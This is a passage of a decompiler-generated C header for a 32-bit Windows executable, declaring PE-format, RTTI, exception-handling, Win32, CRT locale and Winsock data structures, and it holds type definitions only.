typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor *pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor **pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

typedef struct _s_ESTypeList ESTypeList;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
    ESTypeList *pESTypeList;
    int EHFlags;
};

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

struct _s_ESTypeList {
    int nCount;
    HandlerType *pTypeArray;
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor *pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef ulonglong __uint64;

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

typedef long LONG;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef int INT_PTR;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Class Structure
};

typedef struct bad_exception bad_exception, *Pbad_exception;

struct bad_exception { // PlaceHolder Class Structure
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef void (*_PHNDLR)(int);

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _strflt *STRFLT;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef struct HRSRC__ *HRSRC;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct WSAData WSAData, *PWSAData;

typedef struct WSAData WSADATA;

struct WSAData {
    WORD wVersion;
    WORD wHighVersion;
    char szDescription[257];
    char szSystemStatus[129];
    ushort iMaxSockets;
    ushort iMaxUdpDg;
    char *lpVendorInfo;
};

typedef ushort u_short;

typedef UINT_PTR SOCKET;

typedef WSADATA *LPWSADATA;

typedef struct sockaddr sockaddr, *Psockaddr;

struct sockaddr {
    u_short sa_family;
    char sa_data[14];
};

typedef ulong u_long;

typedef struct hostent hostent, *Phostent;

struct hostent {
    char *h_name;
    char **h_aliases;
    short h_addrtype;
    short h_length;
    char **h_addr_list;
};

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
